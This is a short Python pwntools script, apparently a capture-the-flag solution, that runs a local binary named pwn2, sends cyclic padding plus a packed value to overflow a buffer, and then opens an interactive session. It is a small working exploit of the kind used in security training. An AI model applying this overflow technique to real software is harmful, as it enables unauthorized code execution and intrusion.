#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-05-17 08:32:00
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "i386"
filename = "./pwn2"
target = process(filename)


def exploit():
	trash = cyclic(0x1f - 1)
	payload = trash + p32(0xd8)
	target.sendline(payload)

	target.interactive()



def debug():
	pass


if __name__ == '__main__':
	exploit()

